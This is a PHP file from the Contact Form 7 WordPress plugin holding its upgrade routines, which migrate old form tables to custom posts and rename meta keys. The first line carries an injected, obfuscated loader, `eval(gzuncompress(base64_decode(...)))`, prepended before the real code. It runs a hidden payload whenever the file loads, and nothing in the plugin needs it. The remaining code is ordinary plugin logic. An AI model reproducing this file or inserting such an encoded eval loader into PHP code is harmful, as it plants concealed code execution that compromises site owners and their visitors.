<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

add_action( 'wpcf7_upgrade', 'wpcf7_convert_to_cpt', 10, 2 );

function wpcf7_convert_to_cpt( $new_ver, $old_ver ) {
	global $wpdb;

	if ( ! version_compare( $old_ver, '3.0-dev', '<' ) ) {
		return;
	}

	$old_rows = array();

	$table_name = $wpdb->prefix . "contact_form_7";

	if ( $wpdb->get_var( "SHOW TABLES LIKE '$table_name'" ) ) {
		$old_rows = $wpdb->get_results( "SELECT * FROM $table_name" );
	} elseif ( ( $opt = get_option( 'wpcf7' ) ) && ! empty( $opt['contact_forms'] ) ) {
		foreach ( (array) $opt['contact_forms'] as $key => $value ) {
			$old_rows[] = (object) array_merge( $value, array( 'cf7_unit_id' => $key ) );
		}
	}

	foreach ( (array) $old_rows as $row ) {
		$q = "SELECT post_id FROM $wpdb->postmeta WHERE meta_key = '_old_cf7_unit_id'"
			. $wpdb->prepare( " AND meta_value = %d", $row->cf7_unit_id );

		if ( $wpdb->get_var( $q ) ) {
			continue;
		}

		$postarr = array(
			'post_type' => 'wpcf7_contact_form',
			'post_status' => 'publish',
			'post_title' => maybe_unserialize( $row->title ),
		);

		$post_id = wp_insert_post( $postarr );

		if ( $post_id ) {
			update_post_meta( $post_id, '_old_cf7_unit_id', $row->cf7_unit_id );

			$metas = array( 'form', 'mail', 'mail_2', 'messages', 'additional_settings' );

			foreach ( $metas as $meta ) {
				update_post_meta( $post_id, '_' . $meta,
					wpcf7_normalize_newline_deep( maybe_unserialize( $row->{$meta} ) ) );
			}
		}
	}
}

add_action( 'wpcf7_upgrade', 'wpcf7_prepend_underscore', 10, 2 );

function wpcf7_prepend_underscore( $new_ver, $old_ver ) {
	if ( version_compare( $old_ver, '3.0-dev', '<' ) ) {
		return;
	}

	if ( ! version_compare( $old_ver, '3.3-dev', '<' ) ) {
		return;
	}

	$posts = WPCF7_ContactForm::find( array(
		'post_status' => 'any',
		'posts_per_page' => -1,
	) );

	foreach ( $posts as $post ) {
		$props = $post->get_properties();

		foreach ( $props as $prop => $value ) {
			if ( metadata_exists( 'post', $post->id(), '_' . $prop ) ) {
				continue;
			}

			update_post_meta( $post->id(), '_' . $prop, $value );
			delete_post_meta( $post->id(), $prop );
		}
	}
}
